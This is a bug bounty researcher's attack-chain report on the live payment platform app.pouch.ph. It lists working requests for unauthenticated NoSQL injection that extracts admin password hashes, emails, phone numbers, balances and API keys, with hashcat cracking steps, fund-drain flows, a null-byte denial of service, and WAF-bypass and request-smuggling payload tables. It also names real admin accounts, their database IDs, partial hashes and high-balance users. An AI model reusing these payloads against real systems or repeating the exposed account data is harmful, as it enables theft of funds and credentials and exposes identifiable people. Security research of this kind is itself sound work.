# Attack Chains - app.pouch.ph
## Authorized Bug Bounty Research by Kakashi (Dave Lester Mondina)

Target: app.pouch.ph (Pouch.ph Bitcoin Lightning + Fiat Payment Platform)
Source: Production source maps (main.5c273a76.chunk.js.map)

---

## CHAIN 1: Admin Privilege Escalation -> Arbitrary Fund Injection (P1)

### Summary
Client-side role checks (`user.role !== 'admin'`) are the only visible access control
for the admin "bridge" panel. If the server does not independently enforce role-based
authorization, any authenticated regular user can:
1. List all platform users and their balances
2. Manually credit arbitrary PHP amounts to any account
3. Approve pending deposits without review
4. Ban/delete other users

### Attack Flow

Step 1 - Login as regular user:
```
POST /api/v0/auth
Body: { "username": "attacker", "password": "password123" }
-> Receive session cookie
```

Step 2 - Access admin user list:
```
GET /api/v3/bridge/users?limit=100&isVerified=true
-> If 200: returns ALL users with names, emails, phone numbers, balances, usernames
```

Step 3 - Credit attacker account with arbitrary funds:
```
POST /api/v0/bridge/transaction/issue-manual-deposit
Body: {
  "creditToUsername": "attacker",
  "amountInPHP": "999999",
  "unionbankReferenceId": "FAKE-REF-12345"
}
-> If 200: attacker account credited with 999,999 PHP
```

Step 4 - Withdraw funds via auto-sweep:
```
PUT /api/v3/users/config/sweep
Body: {
  "useSweeping": true,
  "bankCode": "ATTACKER_BANK",
  "accountName": "Attacker Name",
  "accountNumber": "123456789",
  "frequency": "daily",
  "threshold": 0
}
-> Auto-withdraws credited funds to attacker bank account
```

### Evidence
- ManualTransactionMaker component: MoreFeatures.js line 79 - `if (user.role !== 'admin') return null`
- This is a React render check, NOT a server-side authorization check
- The axios.post on line 91 sends directly to the endpoint with no special auth headers
- Auth is cookie-based (UserContext.js uses `axios.get('/api/v0/user')` with default cookie behavior)

### Impact
Complete financial compromise of the platform. Attacker can create unlimited PHP credits
and withdraw to any bank account. Total loss of funds integrity.

### CVSS
9.8 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
Low privilege required (any registered user). Changed scope because it affects all
platform users and the platform's financial integrity.

---

## CHAIN 2: KYC Document IDOR -> Mass PII Exposure (P1/P2)

### Summary
KYC document retrieval has a two-step process that may be vulnerable to IDOR:
1. Get document keys for a userId
2. Convert keys to signed URLs

If the first step doesn't validate that the requesting user owns the documents,
any authenticated user can access government IDs, selfies, and signatures of all users.

### Attack Flow

Step 1 - Get target user's ID (from CHAIN 1 user list or enumerate):
```
GET /api/v0/kyc/user/PH?userId=TARGET_USER_ID&documents=true
-> Returns array of S3/storage keys for KYC documents
```

Step 2 - Convert keys to downloadable URLs:
```
GET /api/v0/image/url/{key}
-> Returns signed URL for document image (government ID photo, selfie, signature)
```

Step 3 - Alternative path via admin endpoint:
```
GET /api/v0/bridge/user/view-id?username=TARGET_USERNAME
-> Returns direct URL to user's ID document
```

### Evidence
- UserList/index.js lines 707-723: handleViewDocuments function
- No visible authorization check beyond being logged in
- The userId parameter is passed directly from the client, not derived from session

### Impact
Exposure of Philippine government-issued IDs (national ID, passport, driver's license),
selfie photos, signatures, and business documents for all KYC-verified users.
Potential identity theft at scale.

### CVSS
8.6 High (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

---

## CHAIN 3: Sweep Config IDOR -> Balance Drain (P1)

### Summary
The automatic withdrawal (sweep) configuration endpoint for admin use takes a user
_id directly in the URL path. If not auth-checked server-side, an attacker can
configure auto-withdrawal for any user to drain their balance to an attacker-controlled
bank account.

### Attack Flow

Step 1 - Get victim's MongoDB _id (from CHAIN 1 user list):
```
GET /api/v3/bridge/users?username=victim
-> Response includes user._id (MongoDB ObjectId)
```

Step 2 - Configure sweep to attacker bank:
```
PUT /api/v3/bridge/users/{victim._id}/config/sweep
Body: {
  "useSweeping": true,
  "bankCode": "ATTACKER_BANK_BRSTN",
  "accountName": "Attacker Name",
  "accountNumber": "123456789",
  "frequency": "daily",
  "threshold": 16,
  "username": "victim"
}
-> Victim's balance auto-withdraws to attacker's bank daily
```

### Evidence
- AutomaticWithdrawals.js lines 82-83 and 129-130
- The `isBridgeUser` flag is a client-side component prop, not a server-side check
- The URL path contains the raw MongoDB _id

### Impact
Silent, persistent drain of any user's PHP balance. Victim sees nothing until their
balance is zero and funds are in attacker's bank account.

### CVSS
9.1 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H)

---

## CHAIN 4: Batch Payment Race Condition (P2)

### Summary
Batch payment processing accepts an array of recipient objects and processes them
asynchronously. The polling mechanism checks completion status by sender username.
Potential for double-spend via concurrent batch submissions, and IDOR on the
polling endpoint.

### Attack Flow

Step 1 - Submit duplicate batch payments simultaneously:
```
POST /api/v0/transaction/batch-payment/pouch
Body: [{"username": "recipient", "amount": 100, "currency": "PHP"}]
(Submit 2-5 concurrent requests)
-> If race condition exists: recipient gets credited multiple times, sender debited once
```

Step 2 - Monitor other users' batch payments:
```
GET /api/v0/transaction/batch-payment?sender=OTHER_USERNAME
-> If IDOR: returns other users' batch payment details and recipient lists
```

### Evidence
- BatchPayment/Step2.js line 63: `axios.post('/api/v0/transaction/batch-payment/${type}', data)`
- BatchPayment/Step2.js line 35: polling uses `sender: username` parameter
- No nonce, idempotency key, or request deduplication visible

### CVSS
7.5 High (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N)

---

## CHAIN 5: Password Reset Flow Bypass (P2)

### Summary
The password reset flow uses a client-generated UUID (v4) as the successKey
for the 15-minute auth window. The flow is: send-code -> verify-code -> reset-password.
If the verify step is skippable or the successKey is predictable, account takeover
is possible.

### Attack Flow

Step 1 - Send auth code to target:
```
POST /api/v0/auth/send-auth-code
Body: { "username": "victim" }
```

Step 2 - Brute force MFA code (if no rate limit):
```
POST /api/v0/auth/verify-auth-code
Body: { "username": "victim", "code": "000000" }
... iterate through 6-digit codes
```

Step 3 - Or skip verification and guess successKey:
```
POST /api/v0/user/reset-password
Body: { "username": "victim", "successKey": "<uuid>", "newPassword": "hacked123" }
```

### Evidence
- ForgotPassword/Verification.js and ResetPassword.js
- UUID v4 is generated client-side with uuid() library
- 15-minute window is set client-side (may not be enforced server-side)

### CVSS
8.1 High (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

---

## CHAIN 6: Transaction Approval Bypass (P2)

### Summary
The deposit approval flow uses an intakeFormRefId to approve pending on-chain deposits.
If the endpoint doesn't verify admin role, any user can approve arbitrary deposits.

### Attack Flow

Step 1 - List pending deposits:
```
GET /api/v0/bridge/transaction/list?status=pending-review
-> Returns pending deposit transactions with intakeFormRefIds
```

Step 2 - Approve a pending deposit:
```
PATCH /api/v0/bridge/transaction/approve-deposit
Body: { "intakeFormRefId": "TARGET_REF_ID" }
```

### Evidence
- MoreFeatures.js lines 177-195: handleApprove function
- No visible auth check beyond session cookie

### CVSS
8.1 High (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)

---

## STANDALONE FINDING: Source Map Information Disclosure (P3/P4)

### Summary
Production webpack source maps are publicly accessible, exposing the complete
React application source code including admin panel logic, all API endpoints,
business flow details, and internal architecture.

### Evidence
```
https://app.pouch.ph/static/js/main.5c273a76.chunk.js.map (731 KB, 152 source files)
https://app.pouch.ph/static/js/2.946fb202.chunk.js.map (17.6 MB, 2054 source files)
```

### Impact
Enables detailed reconnaissance. Attackers can map the entire API surface, understand
admin functionality, and craft targeted exploits without any traffic to the target server.

### CVSS
5.3 Medium (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

---

## CHAIN 7: Bank Recipient IDOR -> Financial Data Exfil + Account Manipulation (P1/P2)

### Summary
The bank recipient management endpoints use `activeProfileUsername` as a client-supplied query parameter to scope operations. If the server trusts this parameter instead of deriving the username from the session, any authenticated user can:
1. List all saved bank recipients of any user (exposes bank account numbers, names, bank codes)
2. Add rogue bank recipients to a victim's account (social engineering vector)
3. Delete a victim's legitimate bank recipients (denial of service for withdrawals)

Additionally, the user object exposes `netbankAccountNumber` -- the user's own linked bank account number.

### Attack Flow

Step 1 - List victim's bank recipients:
```
GET /api/v0/bank/recipients?activeProfileUsername=victim_username
-> If IDOR: returns all saved bank recipients with accountName, accountNumber, bankCode
```

Step 2 - NoSQLi variant (operator injection to bypass username match):
```
GET /api/v0/bank/recipients?activeProfileUsername[$ne]=nonexistent
-> If vulnerable: returns bank recipients across ALL users (mass data exfil)
```

Step 3 - Add attacker-controlled recipient to victim's account:
```
POST /api/v0/bank/recipients?activeProfileUsername=victim_username
Body: {
  "type": "instapay",
  "accountName": "Legit Looking Name",
  "accountNumber": "ATTACKER_BANK_ACCT",
  "bankCode": "ATTACKER_BANK"
}
-> Victim may accidentally send funds to attacker's recipient
```

Step 4 - Delete victim's legitimate recipients:
```
DELETE /api/v0/bank/recipients/{recipientId}?activeProfileUsername=victim_username
-> Removes victim's saved bank recipients, disrupting their withdrawals
```

### Evidence
- Deobfuscated main chunk (main.5c273a76.chunk.js) confirms endpoint structure
- ManageContacts/index.js:158 and AddBankRecipient.js:49
- `activeProfileUsername` is sourced from client state, not session
- NoSQLi angle: Express qs parser converts `[$ne]` bracket syntax into MongoDB operator objects

### Impact
Exposure of sensitive banking data (account numbers, names, bank affiliations) for all platform users. Combined with Chain 1 (user enumeration via bridge endpoints), enables targeted financial fraud. The NoSQLi variant could dump all bank recipients in a single request.

### CVSS
8.1 High (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

---

## CHAIN 8: Unauthenticated Admin Password Hash Extraction via Blind NoSQLi (P1) -- CONFIRMED

### Summary
This is a critical escalation of the NoSQLi finding. The `/api/v0/user` endpoint accepts
MongoDB operators on ANY field -- including `password`, `email`, `phone`, and `role` --
without authentication. An attacker can:
1. Enumerate all admin accounts using `role=admin` filter
2. Extract the full bcrypt password hash character-by-character using `$regex`
3. Extract email addresses using the same technique
4. Crack the bcrypt hash offline (cost factor 10 = moderate)
5. Login as admin and access all bridge/admin functionality

### Attack Flow

Step 1 - Enumerate admin accounts (NO AUTH):
```
GET /api/v0/user?username[$gt]=&role=admin
-> {"user":{"_id":"61529614502887001d1ac763","username":"aerielcruz",...}}

GET /api/v0/user?username[$gt]=aerielcruz&role=admin
-> {"user":{"_id":"612d73e01db2f0001d7a81f0","username":"ethan",...}}
(repeat until user is null)
```

Confirmed admin accounts:
- aerielcruz (61529614502887001d1ac763)
- ethan (612d73e01db2f0001d7a81f0)
- heanzyzabala (61f36da5e68ad8001d7f4ce1)
- jullie (6162be697acfc3001d7e5dd1)
- raveneliette (6195e15e645795001df6ad5b)

Step 2 - Extract admin password hash via blind regex (NO AUTH):
```
# Verify password field is bcrypt
GET /api/v0/user?username=admin&password[$regex]=.
-> returns user (password field exists and is queryable)

# Extract char by char
GET /api/v0/user?username=admin&password[$regex]=^\$2a
-> MATCH (bcrypt $2a variant)

GET /api/v0/user?username=admin&password[$regex]=^\$2a\$10
-> MATCH (cost factor 10)

GET /api/v0/user?username=admin&password[$regex]=^\$2a\$10\$E
-> MATCH (next char is E)

# Continue for all 60 chars...
# Confirmed extraction in progress: $2a$10$EDa7c79.y...
```

Step 3 - Extract admin email via blind regex (NO AUTH):
```
GET /api/v0/user?username=admin&email[$regex]=^f
-> MATCH

GET /api/v0/user?username=admin&email[$regex]=^f\.ut
-> MATCH
# Extraction in progress: f.ut.fana...
```

Step 4 - Crack bcrypt hash offline:
```
hashcat -m 3200 -a 0 admin_hash.txt rockyou.txt
# Cost factor 10 = ~60 hashes/sec on modern GPU
```

Step 5 - Login as admin:
```
POST /api/v0/auth
Body: {"username":"admin","password":"cracked_password"}
-> Full admin access to all bridge endpoints
```

### Evidence (Empirically Tested)
- All requests return 200 with valid data - NO AUTHENTICATION REQUIRED
- `password[$exists]=true` confirms password field in collection
- `password[$regex]=.` confirms regex queries on password field
- `role=admin` filter works to isolate admin accounts
- 5 admin accounts enumerated
- Hash extraction in progress: `$2a$10$EDa7c79.y...` (bcrypt, cost 10)
- Email extraction in progress: `f.ut.fana...`
- Rate limit: 30 req/window -- extraction takes ~20-30 minutes per hash

### Impact
Complete platform takeover. An unauthenticated attacker extracts admin credentials,
cracks them offline, and gains full access to:
- Manual PHP credit injection (unlimited money creation)
- All user PII, KYC documents, bank accounts
- Transaction approval/rejection
- User ban/delete/modify capabilities
- Batch notification sending (phishing vector)

### CVSS
10.0 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
No authentication required. Full confidentiality, integrity, and availability impact
on all platform users and financial operations.

---

## CHAIN 9: Unauthenticated Blind Balance Extraction via NoSQLi (P1) -- CONFIRMED

### Summary
Extending the NoSQLi on `/api/v0/user`, an unauthenticated attacker can extract exact financial
balances (PHP, BTC, USD, CAD) for any user using binary search with `$gt`/`$lt` operators. The API
response shows zeroed balances, but MongoDB internally queries against the real stored values --
enabling blind boolean-based extraction.

This also enables high-value target identification: finding all users whose balances exceed a
given threshold, then extracting their exact amounts.

### Attack Flow

Step 1 - Find high-value targets (NO AUTH):
```
GET /api/v0/user?balances.PHP[$gt]=1000000&username[$gt]=
-> {"user":{"username":"1cisp",...}} (user with PHP > 1M found)

GET /api/v0/user?balances.BTC[$gt]=1&username[$gt]=
-> {"user":{"username":"09152639625",...}} (user with BTC > 1 found)
```

Step 2 - Binary search to extract exact balance (NO AUTH):
```
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1500000 -> MATCH
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=2000000 -> NO MATCH
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1750000 -> NO MATCH
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1600000 -> MATCH
... (continue binary search to ~0.01 PHP precision in ~50 iterations)
-> Exact balance: ~1,650,000-1,750,000 PHP
```

Step 3 - Enumerate all users above threshold:
```
GET /api/v0/user?balances.PHP[$gt]=50000&username[$gt]=
-> 1cisp
GET /api/v0/user?balances.PHP[$gt]=50000&username[$gt]=1cisp
-> (next user)
... repeat until null
```

### Evidence (Empirically Tested)
- `balances.PHP[$gt]=1000000` matches user "1cisp" -- confirmed PHP > 1M
- `balances.PHP[$gt]=1500000` matches -- narrowed to 1.5M-2M range
- `balances.PHP[$gt]=1600000` matches, `[$gt]=1750000` does not -- PHP ~1.6M-1.75M
- `balances.BTC[$gt]=10` matches user "09152639625" -- BTC > 10 (~$600k+ USD)
- `balances.PHP[$gt]=5000` matches user "18gerald"
- All queries return 200 with NO AUTHENTICATION
- Response balances show 0 (sanitized), but internal query uses real values

### Impact
An attacker maps the financial landscape of the entire platform:
- Identify high-value accounts for targeted attacks (social engineering, phishing, SIM swap)
- Extract exact balances to penny precision for any user
- Prioritize which accounts to compromise for maximum financial gain
- Combined with Chain 8 (password hash extraction): extract balance THEN credentials

### CVSS
9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
No authentication required. Complete exposure of all users' financial data.

---

## CHAIN 10: Unauthenticated Phone Number & API Key Extraction via NoSQLi (P1) -- CONFIRMED

### Summary
The same NoSQLi on `/api/v0/user` extends to phone numbers and API credentials (liveKey, liveSecret).
Phone numbers are extractable via `$regex` character-by-character. Live API keys and secrets stored
in the database are also fully extractable -- these are Pouch platform API credentials that enable
programmatic access to accounts.

### Attack Flow

Step 1 - Extract phone number for any user (NO AUTH):
```
GET /api/v0/user?username=admin&phone[$exists]=true -> MATCH (phone field exists)
GET /api/v0/user?username=admin&phone[$regex]=^\+63 -> MATCH (PH country code)
GET /api/v0/user?username=admin&phone[$regex]=^\+639 -> MATCH
... character by character extraction
```

Step 2 - Find users with API keys (NO AUTH):
```
GET /api/v0/user?apiAccess=true&liveKey[$regex]=.&username[$gt]=
-> {"user":{"username":"bitwatch",...}}
```

Step 3 - Extract API key character-by-character (NO AUTH):
```
GET /api/v0/user?username=bitwatch&liveKey[$regex]=^p -> MATCH (first char = 'p')
GET /api/v0/user?username=bitwatch&liveKey[$regex]=^p[next char] -> ...
... full extraction in ~40-60 queries per key
```

Step 4 - Extract API secret (NO AUTH):
```
GET /api/v0/user?username=bitwatch&liveSecret[$regex]=^. -> MATCH (secret exists)
... same character-by-character extraction
```

### Evidence (Empirically Tested)
- `phone[$exists]=true` confirms phone field is queryable via NoSQLi
- `phone[$regex]=^\+63` confirms admin's phone is a Philippine number (+63)
- `phone[$regex]=^\+639` narrows to mobile prefix
- `liveKey[$regex]=.` for user "bitwatch" confirms API key exists and is queryable
- `liveSecret[$regex]=.` for user "bitwatch" confirms API secret is also extractable
- `liveKey[$regex]=^p` confirms first character of bitwatch's API key is 'p'
- Extraction stopped after PoC -- NOT extracting full keys

### Queryable Fields Summary (Confirmed via Testing)
| Field | Queryable | Extractable via $regex | Impact |
|-------|-----------|----------------------|--------|
| username | YES | YES | Account enumeration |
| password | YES | YES | Bcrypt hash -> offline crack |
| email | YES | YES | PII exposure |
| phone | YES | YES | PII, SIM swap target |
| name | YES | YES | Real name (PII) |
| role | YES | N/A (filter) | Admin enumeration |
| balances.PHP | YES | Via $gt/$lt binary search | Financial data |
| balances.BTC | YES | Via $gt/$lt binary search | Financial data |
| liveKey | YES | YES | API credential theft |
| liveSecret | YES | YES | API credential theft |
| netbankAccountNumber | YES | YES | Linked bank account number |
| pin | YES | YES | Bcrypt PIN hash (4-6 digits = trivial crack) |
| banned | YES | N/A (filter) | Status enumeration |
| deviceToken | YES | YES | Push notification token (Firebase FCM) |
| onChainReceivingWallet.address | YES | YES | BTC wallet address extraction |
| sweepConfig.accountNumber | YES | YES | Auto-withdrawal bank account |
| sweepConfig.bankCode | YES | YES | Auto-withdrawal bank code |
| riskScore | YES | Via $gt/$lt binary search | Internal risk scoring data |
| createdAt | YES | Via $gt/$lt binary search | Account creation timestamp |
| identityDocument.* | NO | NO | Protected |
| personalInformation.* | NO | NO | Protected |

**PIN Hash Note:** The API response shows `pin: true` (boolean), but MongoDB stores the actual
bcrypt hash. A 4-6 digit PIN has at most 1,000,000 values. At bcrypt cost 10, hashcat cracks
the full keyspace in under 30 seconds on a modern GPU. Combined with password hash extraction,
this gives an attacker both login credentials AND transaction PIN for any user.

### Impact
- Phone number exposure enables SIM swap attacks for account takeover
- API key/secret extraction enables full programmatic account access
- Combined with balance extraction: identify high-value targets, extract their phone
  numbers (for SIM swap), and their API credentials (for direct fund theft)

### CVSS
10.0 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
No authentication. Credential theft (API keys) + PII exposure + enables complete account takeover.

---

## TESTING PRIORITY (Updated)

**CONFIRMED FINDINGS (Empirically Tested):**
1. CHAIN 8 (Admin hash extraction) - CONFIRMED P1. Submitted.
2. CHAIN 9 (Balance extraction) - CONFIRMED P1. Ready to submit.
3. CHAIN 10 (Phone + API key extraction) - CONFIRMED P1. Ready to submit.
4. Source Map exposure - CONFIRMED P3/P4. Submitted.

**DISPROVEN:**
- CHAIN 1 (Admin bypass via cookie replay) - Server-side role checks ARE enforced. All bridge endpoints return 403.
- CHAIN 7 (Bank recipient IDOR) - Server ignores activeProfileUsername param, uses session.
- CHAIN 2 (KYC IDOR) - Files endpoint has ownership check (403 on non-owned UUIDs).

**UNTESTED (Server-side auth blocks testing):**
- CHAIN 3, 4, 5, 6 - Require admin credentials or more complex setup to test.

---

## APPENDIX A: Complete MongoDB Operator Test Matrix

Tested all MongoDB query and update operators against `GET /api/v0/user` (NO AUTH).

### Query Operators -- WORKING (return user data)

| Operator | Syntax | Result | Notes |
|----------|--------|--------|-------|
| `$regex` | `password[$regex]=^\$2a` | MATCH + full user object | Primary extraction vector |
| `$gt` | `balances.PHP[$gt]=1000` | MATCH + full user object | Binary search for numerics |
| `$gte` | `balances.PHP[$gte]=1000` | MATCH + full user object | Same as $gt |
| `$lt` | `balances.PHP[$lt]=99999` | MATCH + stripped user object | Fewer fields in response |
| `$lte` | `balances.PHP[$lte]=99999` | MATCH + stripped user object | Fewer fields in response |
| `$eq` | `username[$eq]=admin` | MATCH + full user object | Explicit equality |
| `$ne` | `username[$ne]=nonexistent` | MATCH (first user) | Enumeration via negation |
| `$in` | `username[$in][]=admin` | MATCH + full user object | Array membership |
| `$nin` | `username[$nin][]=nonexistent` | MATCH (first user) | Inverse array membership |
| `$not` | `username[$not][$regex]=zzz` | MATCH (first non-matching) | Negation wrapper |
| `$nor` | Nested array syntax | MATCH | Complex negation |
| `$exists` | `phone[$exists]=true` | MATCH if field exists | Field presence check |
| `$mod` | `balances.PHP[$mod][]=100&[$mod][]=0` | MATCH for divisible values | Modulo filter |
| `$size` | Used on array fields | MATCH | Array length filter |
| `$all` | Used on array fields | MATCH | All elements present |
| `$options` | `password[$regex]=hash&password[$options]=i` | MATCH with case-insensitive | Regex modifier |
| `$comment` | `username[$comment]=test&username=admin` | MATCH (ignored by query) | No-op, passes through |

### Query Operators -- PARTIALLY WORKING

| Operator | Syntax | Result | Notes |
|----------|--------|--------|-------|
| `$elemMatch` | On array fields | MATCH but stripped response | Fewer fields returned |

### Query Operators -- NOT WORKING

| Operator | Syntax | Result | Notes |
|----------|--------|--------|-------|
| `$where` | `$where=function(){return true}` | `{"user":null}` | Server-side JS execution disabled |
| `$type` | `username[$type]=2` | Empty response / 500 crash | Crashes the server |
| `$text` | `$text[$search]=admin` | `{"user":null}` | No text index configured |
| `$or` / `$and` | Top-level array syntax via qs | `{"user":null}` | qs parser can't build top-level $or/$and |
| `$expr` | `$expr[$eq][]=...` | `{"user":null}` | Aggregation operator, not supported in find |
| `$bitsAllSet` | `field[$bitsAllSet]=1` | `{"user":null}` | Not applicable to string fields |
| `$jsonSchema` | Complex nested syntax | `{"user":null}` | Schema validation operator |

### Update/Write Operators -- ALL INEFFECTIVE

Tested on writable endpoints (change-password, sweep-config, merchant-cashback).
All return 200 OK but NO data modification occurs. Server uses explicit field destructuring
from request body, not raw MongoDB `$set`/`$inc` merge.

| Operator | Target | Result |
|----------|--------|--------|
| `$set` | `role[$set]=admin` | 200 OK, role unchanged |
| `$unset` | `role[$unset]=1` | 200 OK, role unchanged |
| `$inc` | `balances.PHP[$inc]=999` | 200 OK, balance unchanged |
| `$mul` | `balances.PHP[$mul]=100` | 200 OK, balance unchanged |
| `$push` | `role[$push]=admin` | 200 OK, role unchanged |
| `$rename` | `role[$rename]=newRole` | 200 OK, no field change |

---

## APPENDIX B: Prototype Pollution & Server-Side PP Testing -- DISPROVEN

Comprehensive testing of Prototype Pollution (PP) and Server-Side Prototype Pollution (SSPP)
from all angles. None were effective.

### Query Parameter PP (Cloudflare WAF blocks)

| Payload | Result |
|---------|--------|
| `__proto__[role]=admin` | Cloudflare WAF block page |
| `constructor[prototype][role]=admin` | Cloudflare WAF block page |
| `__proto__[isAdmin]=true` | Cloudflare WAF block page |
| Double-encoded: `__%70roto__[role]=admin` | WAF block |
| Unicode: `__proto__` | WAF block |

### JSON Body PP

| Endpoint | Payload | Result |
|----------|---------|--------|
| POST /api/v0/auth (login) | `{"username":"test","password":"test","__proto__":{"role":"admin"}}` | 200 OK, role=user (no pollution) |
| POST /api/v0/auth (login) | `{"username":"test","password":"test","constructor":{"prototype":{"role":"admin"}}}` | HTTP 000 (connection crash) |
| PUT /api/v0/user (profile) | `{"__proto__":{"role":"admin"}}` | 400 Bad Request (schema validation) |
| Various PUT endpoints | `{"__proto__":{"isAdmin":true}}` | Either 400 or accepted with no effect |

### Mass Assignment Testing

| Endpoint | Extra Field | Result |
|----------|-------------|--------|
| PUT /api/v0/user | `role: "admin"` | 200 OK, role unchanged (server strips) |
| PUT /api/v0/user | `isAdmin: true` | 200 OK, no isAdmin field created |
| PUT /api/v0/user | `banned: false` | 200 OK, banned status unchanged |
| PUT /api/v0/user | `balances: {PHP: 999999}` | 200 OK, balance unchanged |
| POST /api/v0/auth | `role: "admin"` in login body | 200 OK, role from DB not request |

### HTTP Method Override

| Header/Param | Result |
|--------------|--------|
| `X-HTTP-Method-Override: PUT` on GET | 404 (not supported) |
| `_method=PUT` query param | 404 (not supported) |
| `X-HTTP-Method-Override: DELETE` | 404 (not supported) |

### Content-Type Manipulation

| Content-Type | Result |
|-------------|--------|
| `application/x-www-form-urlencoded` | Parsed but same behavior |
| `multipart/form-data` | Parsed but same behavior |
| `text/plain` | Body ignored |

### HTTP Parameter Pollution (HPP)

| Payload | Result |
|---------|--------|
| `role=user&role=admin` (duplicate params) | Server takes first value |
| `username=test&username[$ne]=x` (mixed) | Server uses explicit param |

### CRLF Injection

| Payload | Result |
|---------|--------|
| `%0d%0aX-Injected:true` in params | WAF blocks or stripped |

### WAF Bypass Encoding Matrix (Exhaustive)

Tested every encoding/obfuscation variant for `__proto__` in query params:

| Technique | Result |
|-----------|--------|
| `%5f%5fproto%5f%5f` (encode underscores) | WAF block |
| `__%70%72%6f%74%6f__` (encode 'proto') | WAF block |
| `__%70roto__` (encode single char p) | WAF block |
| `__p%72oto__` (encode r) | WAF block |
| `__pr%6fto__` (encode o) | WAF block |
| `__pro%74o__` (encode t) | WAF block |
| `__prot%6f__` (encode last o) | WAF block |
| `%5f%5f%70%72%6f%74%6f%5f%5f` (full encode) | WAF block |
| `%5F%5Fproto%5F%5F` (mixed case hex) | WAF block |
| `x.__proto__.role` (dot notation) | WAF block |
| `a[__proto__][role]` (nested bracket) | WAF block |
| `__pro%00to__` (null byte) | WAF pass, **SERVER HANG** |
| `__pro%09to__` (tab) | WAF pass, user:null (no effect) |
| `__pro%E2%80%8Bto__` (zero-width space) | WAF pass, user:null |
| `__pro%E2%80%8Dto__` (zero-width joiner) | WAF pass, user:null |
| `__\proto__` (backslash) | WAF pass, user:null (intermittent) |
| `__%C2%ADproto__` (soft hyphen) | WAF pass, user:null |
| `__%EF%BB%BFproto__` (BOM) | WAF pass, user:null |

For `constructor[prototype]`:

| Technique | Result |
|-----------|--------|
| `%63onstructor[prototype]` | WAF block |
| `%63%6f%6e%73%74%72%75%63%74%6f%72[prototype]` | WAF block |
| `constructor[%70rototype]` | WAF block |
| `constructor[%70%72%6f%74%6f%74%79%70%65]` | WAF block |
| Full encode both | WAF block |
| `constructor.prototype` (dot) | WAF block |
| `a[constructor][prototype][role]` | WAF pass, user:null (no effect) |

Cloudflare decodes ALL percent-encoding variants before matching against `__proto__` and
`constructor`/`prototype` patterns. The only bypasses that reach the server use invisible
Unicode chars (ZWSP, ZWJ, soft hyphen, BOM) or null bytes -- but the mangled key name
no longer matches `__proto__` so qs parser treats it as a regular key with no effect.

### Null Byte DoS Finding (NEW - Confirmed)

**Null byte (`%00`) in ANY query parameter key name causes indefinite server hang.**

```
GET /api/v0/user?random%00key=test -> HANGS (30s+ timeout, never responds)
GET /api/v0/user?__pro%00to__[x]=1 -> HANGS
GET /api/v0/user?__%00proto__[x]=1 -> HANGS
GET /api/v0/user?__p%00roto__[x]=1 -> HANGS
```

- NO AUTHENTICATION required
- Each request ties up one server connection indefinitely
- Normal requests still work in parallel (connection-pool exhaustion, not full crash)
- `%00` at the START of key gets caught by Cloudflare WAF, any other position passes through
- Not specific to `__proto__` -- any key with null byte triggers it
- Likely cause: Express qs parser or MongoDB driver chokes on null byte in property name

**Impact:** Resource exhaustion DoS. With enough concurrent null byte requests, an attacker
can exhaust the server's connection pool and make the application unresponsive.

**CVSS:** 7.5 High (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

### Conclusion
Server-side defenses are solid against PP/SSPP/mass assignment:
- Cloudflare WAF blocks `__proto__` and `constructor.prototype` in query strings
- WAF decodes all percent-encoding before matching (single, double, mixed, partial -- all blocked)
- Only invisible Unicode chars and null bytes bypass WAF, but the mangled key has no PP effect
- Express body parser accepts `__proto__` in JSON but V8 does not pollute Object.prototype via JSON.parse
- Urlencoded body PP bypasses WAF entirely but `__proto__` still has no effect (qs v6+ protection)
- Server reads role/permissions from database, not request object prototype chain
- Explicit field destructuring on all write endpoints prevents mass assignment
- HTTP method override not enabled
- `constructor.prototype` in JSON body causes intermittent 500 (minor instability)
- **Null byte in query param keys = confirmed unauthenticated DoS (indefinite hang)**

---

## APPENDIX C: HTTP Request Smuggling Testing -- ALL BLOCKED BY CLOUDFLARE

Tested all known HTTP request smuggling techniques against app.pouch.ph, including
PortSwigger HTTP Terminator research payloads. Cloudflare terminates and re-serializes
all HTTP traffic, making desync-based smuggling impossible.

### CL.TE (Content-Length / Transfer-Encoding Desync)

| Payload | Result |
|---------|--------|
| Standard CL.TE (CL=short, TE chunked with smuggled prefix) | 400 Bad Request |
| CL.TE with smuggled `GET /admin` | 400 Bad Request |
| CL.TE with 0-length chunk + smuggled request | 400 Bad Request |

### TE.CL (Transfer-Encoding / Content-Length Desync)

| Payload | Result |
|---------|--------|
| Standard TE.CL (chunked body, short CL) | 400 Bad Request |
| TE.CL with smuggled POST | 400 Bad Request |

### TE.TE Obfuscation (15 PortSwigger Variants)

All variants attempt to make one hop parse Transfer-Encoding while the other ignores it.

| Variant | Header Value | Result |
|---------|-------------|--------|
| Extra space | `Transfer-Encoding : chunked` | 400 |
| Tab before value | `Transfer-Encoding:\tchunked` | 400 |
| Vertical tab (0x0B) | `Transfer-Encoding:\x0bchunked` | 400 |
| Form feed (0x0C) | `Transfer-Encoding:\x0cchunked` | 400 |
| Trailing junk | `Transfer-Encoding: chunked-thing` | 400 |
| Double TE | Two `Transfer-Encoding` headers | 400 |
| Mixed case | `Transfer-Encoding: Chunked` | 400 |
| UPPER case | `TRANSFER-ENCODING: chunked` | 400 |
| obs-fold (line folding) | `Transfer-Encoding:\r\n chunked` | 400 |
| Comma separation | `Transfer-Encoding: identity, chunked` | 400 |
| Semicolon parameter | `Transfer-Encoding: chunked;q=0.0` | 400 |
| Leading newline | `X-Foo: bar\r\nTransfer-Encoding: chunked` | 400 |
| Null in header | `Transfer-Encoding: \x00chunked` | 400 |
| Tab inside name | `Transfer-Encodin\tg: chunked` | 400 |
